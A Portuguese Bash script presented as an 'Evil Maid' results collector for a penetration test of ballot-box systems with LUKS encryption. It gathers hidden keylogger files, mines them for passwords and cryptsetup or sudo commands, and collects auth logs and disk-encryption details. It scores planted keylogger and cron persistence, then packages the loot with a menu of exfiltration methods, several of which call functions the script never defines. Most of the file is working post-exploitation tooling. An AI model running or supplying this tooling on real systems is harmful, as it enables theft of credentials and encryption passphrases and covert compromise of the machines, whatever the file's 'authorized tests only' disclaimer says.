#!/bin/bash

# Evil Maid Results Collector & Analyzer
# TSE 2025 Ballot-Box TPU System LUKS Penetration Testing
# 
# Script para coleta, análise e exfiltração de resultados
# 
# AVISO: SOMENTE PARA TESTES AUTORIZADOS DE PENETRAÇÃO!
# USO NÃO AUTORIZADO É CRIME!

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configurações
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RESULTS_DIR="$SCRIPT_DIR/../../results"
COLLECTION_DIR="$RESULTS_DIR/collections"
ANALYSIS_DIR="$RESULTS_DIR/analysis"
KEYLOG_FILE="/tmp/.keylog"
BACKUP_KEYLOG="/var/tmp/.keylog_backup"
PERSISTENCE_DIR="/var/lib/.evil-maid"

# Banner
print_banner() {
    echo -e "${PURPLE}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║            Evil Maid Results Collector v2.0              ║"
    echo "║          TSE 2025 Ballot-Box LUKS Penetration            ║"
    echo "║                                                           ║"
    echo "║  Coleta, análise e exfiltração de dados                 ║"
    echo "║  AVISO: SOMENTE PARA TESTES AUTORIZADOS!                ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo
}

# Log com timestamp
log_message() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case "$level" in
        "INFO")  echo -e "${GREEN}[INFO]${NC}  [$timestamp] $message" ;;
        "WARN")  echo -e "${YELLOW}[WARN]${NC}  [$timestamp] $message" ;;
        "ERROR") echo -e "${RED}[ERROR]${NC} [$timestamp] $message" ;;
        "DEBUG") echo -e "${BLUE}[DEBUG]${NC} [$timestamp] $message" ;;
        *)       echo -e "${WHITE}[$level]${NC} [$timestamp] $message" ;;
    esac
}

# Criar estrutura de diretórios
create_directories() {
    mkdir -p "$RESULTS_DIR" "$COLLECTION_DIR" "$ANALYSIS_DIR"
    log_message "INFO" "Estrutura de diretórios criada"
}

# Coletar keylogs e analisar
collect_and_analyze_keylogs() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local keylog_analysis="$ANALYSIS_DIR/keylog_analysis_$timestamp.txt"
    local raw_keylog="$COLLECTION_DIR/raw_keylog_$timestamp.txt"
    
    log_message "INFO" "Coletando e analisando keylogs..."
    
    # Coletar arquivo principal
    if [[ -f "$KEYLOG_FILE" ]] && [[ -s "$KEYLOG_FILE" ]]; then
        cp "$KEYLOG_FILE" "$raw_keylog"
        log_message "INFO" "Keylog principal coletado: $(wc -l < "$KEYLOG_FILE") linhas"
    fi
    
    # Coletar backup
    if [[ -f "$BACKUP_KEYLOG" ]] && [[ -s "$BACKUP_KEYLOG" ]]; then
        cat "$BACKUP_KEYLOG" >> "$raw_keylog"
        log_message "INFO" "Keylog backup adicionado"
    fi
    
    # Coletar de persistence dir se existir
    if [[ -d "$PERSISTENCE_DIR/collected" ]]; then
        find "$PERSISTENCE_DIR/collected" -name "keylog*.txt" -exec cat {} \; >> "$raw_keylog"
    fi
    
    if [[ ! -f "$raw_keylog" ]] || [[ ! -s "$raw_keylog" ]]; then
        log_message "WARN" "Nenhum keylog encontrado para análise"
        return 1
    fi
    
    # Análise dos keylogs
    {
        echo "╔════════════════════════════════════════════════════════════╗"
        echo "║              ANÁLISE DE KEYLOGS EVIL MAID                 ║"
        echo "║            TSE 2025 Ballot-Box Penetration Testing        ║"
        echo "╚════════════════════════════════════════════════════════════╝"
        echo
        echo "Data da análise: $(date)"
        echo "Arquivo analisado: $raw_keylog"
        echo "Tamanho do arquivo: $(wc -c < "$raw_keylog") bytes"
        echo "Total de linhas: $(wc -l < "$raw_keylog")"
        echo
        
        echo "=== ESTATÍSTICAS GERAIS ==="
        echo "Total de teclas pressionadas: $(grep -o '\[.*\]' "$raw_keylog" | wc -l)"
        echo "Sessões de digitação detectadas: $(grep -c "EVIL MAID KEYLOGGER INICIADO" "$raw_keylog")"
        echo "Possíveis senhas capturadas: $(grep -c "POSSÍVEL SENHA" "$raw_keylog")"
        echo
        
        echo "=== ANÁLISE DE SENHAS POTENCIAIS ==="
        grep "POSSÍVEL SENHA" "$raw_keylog" | head -20
        echo
        
        echo "=== PADRÕES DE INTERESSE ==="
        echo "Comandos 'sudo' detectados:"
        grep -i "sudo" "$raw_keylog" | head -10
        echo
        echo "Possíveis comandos LUKS/cryptsetup:"
        grep -iE "(cryptsetup|luks|passwd)" "$raw_keylog" | head -10
        echo
        echo "Sequências de login detectadas:"
        grep -B2 -A2 -iE "(login|password|passwd)" "$raw_keylog" | head -20
        echo
        
        echo "=== ANÁLISE TEMPORAL ==="
        echo "Primeira captura: $(head -1 "$raw_keylog" | grep -o '\[.*\]' | head -1)"
        echo "Última captura: $(tail -1 "$raw_keylog" | grep -o '\[.*\]' | tail -1)"
        echo
        
        echo "=== DISPOSITIVOS DE ENTRADA DETECTADOS ==="
        grep "DISPOSITIVO CONECTADO" "$raw_keylog" | sort -u
        echo
        
        echo "=== SEQUÊNCIAS SUSPEITAS (possíveis credenciais) ==="
        # Procurar por sequências longas sem espaços (possíveis senhas)
        grep -oE '[a-zA-Z0-9!@#$%^&*()_+=-]{8,}' "$raw_keylog" | sort -u | head -20
        echo
        
        echo "=== COMANDOS CRÍTICOS DETECTADOS ==="
        grep -iE "(su |sudo |passwd |cryptsetup |mount |umount )" "$raw_keylog" | head -15
        echo
        
        echo "=== ANÁLISE DE TECLAS ESPECIAIS ==="
        echo "Ctrl+Alt+Del pressionado: $(grep -c "CTRL+ALT+\[DEL\]" "$raw_keylog") vezes"
        echo "Tentativas de Ctrl+C: $(grep -c "CTRL+c" "$raw_keylog") vezes"
        echo "Uso de Tab (autocompletar): $(grep -c "\[TAB\]" "$raw_keylog") vezes"
        echo "Backspaces (correções): $(grep -c "\[BACKSPACE\]" "$raw_keylog") vezes"
        echo
        
    } > "$keylog_analysis"
    
    log_message "INFO" "Análise de keylog salva em: $keylog_analysis"
    
    # Criar resumo executivo
    create_executive_summary "$keylog_analysis" "$raw_keylog"
    
    return 0
}

# Criar resumo executivo
create_executive_summary() {
    local analysis_file="$1"
    local raw_keylog="$2"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local summary_file="$ANALYSIS_DIR/executive_summary_$timestamp.txt"
    
    local possible_passwords=$(grep -c "POSSÍVEL SENHA" "$raw_keylog" 2>/dev/null || echo "0")
    local total_keys=$(grep -o '\[.*\]' "$raw_keylog" 2>/dev/null | wc -l || echo "0")
    local sudo_commands=$(grep -ic "sudo" "$raw_keylog" 2>/dev/null || echo "0")
    local luks_commands=$(grep -icE "(cryptsetup|luks)" "$raw_keylog" 2>/dev/null || echo "0")
    
    {
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║                  RESUMO EXECUTIVO - EVIL MAID                  ║"
        echo "║               TSE 2025 Ballot-Box Penetration Test             ║"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo
        echo "Data: $(date)"
        echo "Penetration Tester: Evil Maid Framework"
        echo "Alvo: Sistema com LUKS Full Disk Encryption"
        echo
        echo "=== RESUMO DOS RESULTADOS ==="
        echo "✓ Total de teclas capturadas: $total_keys"
        echo "✓ Possíveis senhas identificadas: $possible_passwords"
        echo "✓ Comandos sudo detectados: $sudo_commands"
        echo "✓ Comandos LUKS/cryptsetup: $luks_commands"
        echo
        echo "=== NÍVEL DE SUCESSO ==="
        if [[ $possible_passwords -gt 0 ]]; then
            echo "🔴 CRÍTICO: Credenciais potencialmente capturadas"
        elif [[ $sudo_commands -gt 0 ]]; then
            echo "🟡 ALTO: Atividade administrativa detectada"
        elif [[ $total_keys -gt 100 ]]; then
            echo "🟠 MÉDIO: Atividade de teclado significativa capturada"
        else
            echo "🔵 BAIXO: Atividade limitada detectada"
        fi
        echo
        echo "=== RECOMENDAÇÕES ==="
        echo "1. Analisar sequências de senha identificadas"
        echo "2. Correlacionar atividade com logs do sistema"
        echo "3. Verificar comandos administrativos capturados"
        if [[ $luks_commands -gt 0 ]]; then
            echo "4. CRÍTICO: Comandos LUKS detectados - possível compromisso de criptografia"
        fi
        echo
        echo "=== ARQUIVOS GERADOS ==="
        echo "Keylog bruto: $raw_keylog"
        echo "Análise detalhada: $analysis_file"
        echo "Resumo executivo: $summary_file"
        echo
        
    } > "$summary_file"
    
    log_message "INFO" "Resumo executivo criado: $summary_file"
}

# Coletar informações do sistema
collect_system_info() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local system_info="$COLLECTION_DIR/system_info_$timestamp.txt"
    
    log_message "INFO" "Coletando informações do sistema..."
    
    {
        echo "╔════════════════════════════════════════════════════════════╗"
        echo "║                 INFORMAÇÕES DO SISTEMA ALVO               ║"
        echo "║               Evil Maid Attack - System Intel             ║"
        echo "╚════════════════════════════════════════════════════════════╝"
        echo
        echo "Data da coleta: $(date)"
        echo "Hostname: $(hostname)"
        echo
        echo "=== SISTEMA OPERACIONAL ==="
        uname -a
        echo
        if [[ -f "/etc/os-release" ]]; then
            cat /etc/os-release
        fi
        echo
        
        echo "=== HARDWARE ==="
        echo "CPU Info:"
        grep -E "(model name|cpu MHz|cache size)" /proc/cpuinfo | head -10
        echo
        echo "Memory Info:"
        grep -E "(MemTotal|MemAvailable|SwapTotal)" /proc/meminfo
        echo
        echo "Disk Info:"
        lsblk -f
        echo
        
        echo "=== CRIPTOGRAFIA E LUKS ==="
        echo "Dispositivos LUKS detectados:"
        ls -la /dev/mapper/ | grep -v "control\|total"
        echo
        echo "Status cryptsetup:"
        for dev in /dev/mapper/*; do
            if [[ -e "$dev" ]] && [[ "$dev" != "/dev/mapper/control" ]]; then
                echo "Device: $dev"
                cryptsetup status "$dev" 2>/dev/null || echo "  Não é dispositivo LUKS"
                echo
            fi
        done
        
        echo "=== MONTAGENS ==="
        mount | grep -v "tmpfs\|devpts\|sysfs\|proc"
        echo
        
        echo "=== USUÁRIOS ==="
        echo "Usuários logados:"
        who
        echo
        echo "Últimos logins:"
        last | head -10
        echo
        
        echo "=== PROCESSOS RELEVANTES ==="
        echo "Processos relacionados à criptografia:"
        ps aux | grep -iE "(crypt|luks|dm-|gpg)" | grep -v grep
        echo
        echo "Processos de sistema críticos:"
        ps aux | grep -E "(systemd|init|kernel)" | head -10
        echo
        
        echo "=== REDE ==="
        echo "Interfaces de rede:"
        ip addr show
        echo
        echo "Conexões ativas:"
        ss -tulpn | head -20
        echo
        
        echo "=== BOOT E GRUB ==="
        if [[ -f "/boot/grub/grub.cfg" ]]; then
            echo "Configuração GRUB encontrada"
            grep -E "(linux|initrd)" /boot/grub/grub.cfg | head -10
        fi
        echo
        if [[ -d "/boot" ]]; then
            echo "Arquivos de boot:"
            ls -la /boot/ | head -15
        fi
        echo
        
        echo "=== SERVIÇOS ==="
        echo "Serviços ativos relevantes:"
        systemctl list-units --state=active | grep -iE "(crypt|mount|ssh|network)"
        echo
        
        echo "=== LOGS DO SISTEMA (últimas entradas) ==="
        echo "Auth.log (tentativas de login):"
        tail -20 /var/log/auth.log 2>/dev/null || tail -20 /var/log/secure 2>/dev/null || echo "Log não encontrado"
        echo
        echo "Syslog (eventos do sistema):"
        tail -20 /var/log/syslog 2>/dev/null || tail -20 /var/log/messages 2>/dev/null || echo "Log não encontrado"
        echo
        
    } > "$system_info"
    
    log_message "INFO" "Informações do sistema coletadas: $system_info"
}

# Extrair e analisar dados de persistência
analyze_persistence_data() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local persistence_analysis="$ANALYSIS_DIR/persistence_analysis_$timestamp.txt"
    
    log_message "INFO" "Analisando dados de persistência..."
    
    {
        echo "╔════════════════════════════════════════════════════════════╗"
        echo "║               ANÁLISE DE PERSISTÊNCIA EVIL MAID            ║"
        echo "║                   Mechanisms & Effectiveness               ║"
        echo "╚════════════════════════════════════════════════════════════╝"
        echo
        echo "Data da análise: $(date)"
        echo
        
        echo "=== STATUS DOS MECANISMOS DE PERSISTÊNCIA ==="
        
        # Verificar serviços systemd
        echo "Serviços systemd instalados:"
        systemctl list-unit-files | grep -i evil || echo "Nenhum serviço evil-maid encontrado"
        echo
        
        # Verificar cron jobs
        echo "Cron jobs instalados:"
        if [[ -f "/etc/cron.d/evil-collector" ]]; then
            echo "✓ Collector cron job ativo:"
            cat /etc/cron.d/evil-collector
        else
            echo "✗ Nenhum cron job encontrado"
        fi
        echo
        
        # Verificar diretórios de persistência
        echo "Diretórios de persistência:"
        if [[ -d "$PERSISTENCE_DIR" ]]; then
            echo "✓ Diretório principal: $PERSISTENCE_DIR"
            ls -la "$PERSISTENCE_DIR"
        else
            echo "✗ Diretório principal não encontrado"
        fi
        echo
        
        # Verificar dados coletados
        if [[ -d "$PERSISTENCE_DIR/collected" ]]; then
            echo "✓ Dados coletados automaticamente:"
            echo "Total de arquivos: $(find "$PERSISTENCE_DIR/collected" -type f | wc -l)"
            echo "Arquivos mais recentes:"
            ls -lt "$PERSISTENCE_DIR/collected" | head -10
        else
            echo "✗ Nenhum dado coletado automaticamente"
        fi
        echo
        
        # Verificar processos ativos
        echo "=== PROCESSOS ATIVOS ==="
        echo "Keyloggers em execução:"
        pgrep -fl "keylogger" || echo "Nenhum keylogger ativo"
        echo
        
        # Verificar logs de persistência
        if [[ -d "/var/log/.evil-maid" ]]; then
            echo "=== LOGS DE PERSISTÊNCIA ==="
            echo "Arquivos de log encontrados:"
            ls -la /var/log/.evil-maid/
            echo
            if [[ -f "/var/log/.evil-maid/persistence.log" ]]; then
                echo "Últimas entradas do log de persistência:"
                tail -20 /var/log/.evil-maid/persistence.log
            fi
        fi
        echo
        
        echo "=== EFETIVIDADE DA PERSISTÊNCIA ==="
        local effectiveness_score=0
        
        if systemctl is-active --quiet evil-keylogger.service; then
            echo "✓ Keylogger service ativo (+25 pontos)"
            ((effectiveness_score += 25))
        else
            echo "✗ Keylogger service inativo (0 pontos)"
        fi
        
        if [[ -f "/etc/cron.d/evil-collector" ]]; then
            echo "✓ Cron collector ativo (+20 pontos)"
            ((effectiveness_score += 20))
        else
            echo "✗ Cron collector não instalado (0 pontos)"
        fi
        
        if [[ -d "$PERSISTENCE_DIR" ]]; then
            echo "✓ Diretório de persistência exists (+15 pontos)"
            ((effectiveness_score += 15))
        fi
        
        local keylog_files=$(find /tmp /var/tmp "$PERSISTENCE_DIR" -name "*keylog*" 2>/dev/null | wc -l)
        if [[ $keylog_files -gt 0 ]]; then
            echo "✓ Arquivos de keylog encontrados: $keylog_files (+20 pontos)"
            ((effectiveness_score += 20))
        else
            echo "✗ Nenhum arquivo de keylog encontrado (0 pontos)"
        fi
        
        if pgrep -q "keylogger"; then
            echo "✓ Processo keylogger ativo (+20 pontos)"
            ((effectiveness_score += 20))
        else
            echo "✗ Nenhum processo keylogger ativo (0 pontos)"
        fi
        
        echo
        echo "SCORE TOTAL DE EFETIVIDADE: $effectiveness_score/100"
        
        if [[ $effectiveness_score -ge 80 ]]; then
            echo "🔴 PERSISTÊNCIA CRÍTICA: Altamente efetiva"
        elif [[ $effectiveness_score -ge 60 ]]; then
            echo "🟠 PERSISTÊNCIA ALTA: Moderadamente efetiva"
        elif [[ $effectiveness_score -ge 40 ]]; then
            echo "🟡 PERSISTÊNCIA MÉDIA: Parcialmente efetiva"
        else
            echo "🔵 PERSISTÊNCIA BAIXA: Minimamente efetiva"
        fi
        echo
        
    } > "$persistence_analysis"
    
    log_message "INFO" "Análise de persistência salva: $persistence_analysis"
}

# Criar pacote completo de resultados
create_complete_package() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local package_name="evil_maid_complete_results_$timestamp"
    local temp_dir="/tmp/$package_name"
    local final_package="$RESULTS_DIR/$package_name.tar.gz"
    
    log_message "INFO" "Criando pacote completo de resultados..."
    
    # Criar diretório temporário
    mkdir -p "$temp_dir"/{keylogs,analysis,system_info,persistence,tools}
    
    # Copiar keylogs
    find /tmp /var/tmp "$PERSISTENCE_DIR" -name "*keylog*" -type f 2>/dev/null | while read -r file; do
        cp "$file" "$temp_dir/keylogs/" 2>/dev/null
    done
    
    # Copiar análises
    cp "$ANALYSIS_DIR"/* "$temp_dir/analysis/" 2>/dev/null
    
    # Copiar informações do sistema
    cp "$COLLECTION_DIR"/* "$temp_dir/system_info/" 2>/dev/null
    
    # Copiar dados de persistência
    if [[ -d "$PERSISTENCE_DIR" ]]; then
        cp -r "$PERSISTENCE_DIR"/* "$temp_dir/persistence/" 2>/dev/null
    fi
    
    # Copiar logs do sistema
    cp /var/log/.evil-maid/* "$temp_dir/persistence/" 2>/dev/null
    
    # Incluir ferramentas utilizadas
    cp "$SCRIPT_DIR"/* "$temp_dir/tools/" 2>/dev/null
    
    # Criar manifesto
    {
        echo "╔════════════════════════════════════════════════════════════╗"
        echo "║                   EVIL MAID ATTACK PACKAGE                 ║"
        echo "║              TSE 2025 Ballot-Box Penetration Test          ║"
        echo "╚════════════════════════════════════════════════════════════╝"
        echo
        echo "Data de criação: $(date)"
        echo "Hostname alvo: $(hostname)"
        echo "Sistema: $(uname -a)"
        echo
        echo "=== CONTEÚDO DO PACOTE ==="
        echo "keylogs/     - Arquivos de keylog capturados"
        echo "analysis/    - Análises detalhadas dos dados"
        echo "system_info/ - Informações do sistema alvo"
        echo "persistence/ - Dados dos mecanismos de persistência"
        echo "tools/       - Ferramentas utilizadas no ataque"
        echo
        echo "=== ESTATÍSTICAS ==="
        echo "Arquivos de keylog: $(find "$temp_dir/keylogs" -type f | wc -l)"
        echo "Análises geradas: $(find "$temp_dir/analysis" -type f | wc -l)"
        echo "Total de arquivos: $(find "$temp_dir" -type f | wc -l)"
        echo "Tamanho total: $(du -sh "$temp_dir" | cut -f1)"
        echo
        echo "=== RESUMO DO ATAQUE ==="
        if [[ -f "$KEYLOG_FILE" ]] && [[ -s "$KEYLOG_FILE" ]]; then
            echo "✓ Keylogger capturou dados"
        else
            echo "✗ Nenhum dado de keylog capturado"
        fi
        
        if systemctl is-active --quiet evil-keylogger.service 2>/dev/null; then
            echo "✓ Persistência ativa no sistema"
        else
            echo "✗ Persistência não detectada"
        fi
        
        echo
        echo "AVISO: Este pacote contém dados sensíveis coletados durante"
        echo "teste de penetração autorizado. Manter confidencial."
        
    } > "$temp_dir/MANIFEST.txt"
    
    # Criar hash do conteúdo
    find "$temp_dir" -type f -exec sha256sum {} \; | sort > "$temp_dir/SHA256SUMS.txt"
    
    # Criar arquivo compactado
    tar czf "$final_package" -C /tmp "$package_name"
    
    # Limpar diretório temporário
    rm -rf "$temp_dir"
    
    if [[ -f "$final_package" ]]; then
        log_message "INFO" "Pacote completo criado: $final_package"
        echo -e "\n${GREEN}═══════════════════════════════════════${NC}"
        echo -e "${GREEN}   PACOTE DE RESULTADOS CRIADO COM SUCESSO${NC}"
        echo -e "${GREEN}═══════════════════════════════════════${NC}"
        echo -e "${YELLOW}Arquivo:${NC} $final_package"
        echo -e "${YELLOW}Tamanho:${NC} $(ls -lh "$final_package" | awk '{print $5}')"
        echo -e "${YELLOW}SHA256:${NC} $(sha256sum "$final_package" | cut -d' ' -f1)"
        echo
    else
        log_message "ERROR" "Falha ao criar pacote completo"
        return 1
    fi
}

# Exfiltração via métodos diversos
exfiltrate_data() {
    local package_file="$1"
    
    if [[ ! -f "$package_file" ]]; then
        log_message "ERROR" "Arquivo de pacote não encontrado: $package_file"
        return 1
    fi
    
    log_message "INFO" "Iniciando exfiltração de dados..."
    
    echo -e "${CYAN}Métodos de exfiltração disponíveis:${NC}"
    echo "1) HTTP Upload (servidor remoto)"
    echo "2) Base64 encode para copy/paste"
    echo "3) Split em chunks pequenos"
    echo "4) Email (se configurado)"
    echo "5) Dispositivo USB (se disponível)"
    echo "6) Pular exfiltração"
    echo
    read -p "Escolha o método [1-6]: " exfil_method
    
    case "$exfil_method" in
        1) exfiltrate_http "$package_file" ;;
        2) exfiltrate_base64 "$package_file" ;;
        3) exfiltrate_chunks "$package_file" ;;
        4) exfiltrate_email "$package_file" ;;
        5) exfiltrate_usb "$package_file" ;;
        6) log_message "INFO" "Exfiltração pulada pelo usuário" ;;
        *) log_message "WARN" "Método inválido, pulando exfiltração" ;;
    esac
}

# Exfiltração via base64
exfiltrate_base64() {
    local package_file="$1"
    local b64_file="${package_file}.b64"
    
    log_message "INFO" "Convertendo para Base64..."
    
    base64 "$package_file" > "$b64_file"
    
    echo -e "\n${GREEN}Arquivo convertido para Base64:${NC}"
    echo -e "${YELLOW}$b64_file${NC}"
    echo
    echo -e "${CYAN}Para decodificar:${NC}"
    echo "base64 -d $b64_file > $(basename "$package_file")"
    echo
    echo -e "${YELLOW}Primeiras linhas (para verificação):${NC}"
    head -5 "$b64_file"
}

# Exfiltração em chunks
exfiltrate_chunks() {
    local package_file="$1"
    local chunk_size="1M"
    local chunk_dir="${package_file}_chunks"
    
    log_message "INFO" "Dividindo em chunks de $chunk_size..."
    
    mkdir -p "$chunk_dir"
    split -b "$chunk_size" "$package_file" "$chunk_dir/chunk_"
    
    echo -e "\n${GREEN}Arquivo dividido em chunks:${NC}"
    ls -la "$chunk_dir"
    echo
    echo -e "${CYAN}Para reconstruir:${NC}"
    echo "cat $chunk_dir/chunk_* > $(basename "$package_file")"
}

# Menu principal
show_menu() {
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo -e "${CYAN}           MENU DE COLETA               ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo "1) Coletar e analisar keylogs"
    echo "2) Coletar informações do sistema"
    echo "3) Analisar persistência instalada"
    echo "4) Criar pacote completo de resultados"
    echo "5) Análise rápida (keylogs + sistema)"
    echo "6) Sair"
    echo
    read -p "Escolha uma opção [1-6]: " choice
    
    case $choice in
        1) collect_and_analyze_keylogs ;;
        2) collect_system_info ;;
        3) analyze_persistence_data ;;
        4) 
            collect_and_analyze_keylogs
            collect_system_info
            analyze_persistence_data
            create_complete_package
            
            # Perguntar sobre exfiltração
            echo
            read -p "Deseja exfiltrar o pacote? [y/N]: " exfil_choice
            if [[ "$exfil_choice" =~ ^[Yy] ]]; then
                local latest_package=$(ls -t "$RESULTS_DIR"/evil_maid_complete_results_*.tar.gz 2>/dev/null | head -1)
                if [[ -f "$latest_package" ]]; then
                    exfiltrate_data "$latest_package"
                fi
            fi
            ;;
        5)
            collect_and_analyze_keylogs
            collect_system_info
            ;;
        6) 
            log_message "INFO" "Saindo..."
            exit 0 
            ;;
        *) 
            log_message "ERROR" "Opção inválida!" 
            ;;
    esac
}

# Função principal
main() {
    print_banner
    create_directories
    
    if [[ $# -eq 0 ]]; then
        # Modo interativo
        while true; do
            show_menu
            echo
            read -p "Pressione Enter para continuar..."
            clear
            print_banner
        done
    else
        # Modo linha de comando
        case "$1" in
            "keylogs") collect_and_analyze_keylogs ;;
            "system") collect_system_info ;;
            "persistence") analyze_persistence_data ;;
            "complete") 
                collect_and_analyze_keylogs
                collect_system_info
                analyze_persistence_data
                create_complete_package
                ;;
            "quick")
                collect_and_analyze_keylogs
                collect_system_info
                ;;
            *)
                echo "Uso: $0 [keylogs|system|persistence|complete|quick]"
                exit 1
                ;;
        esac
    fi
}

# Executar função principal
main "$@"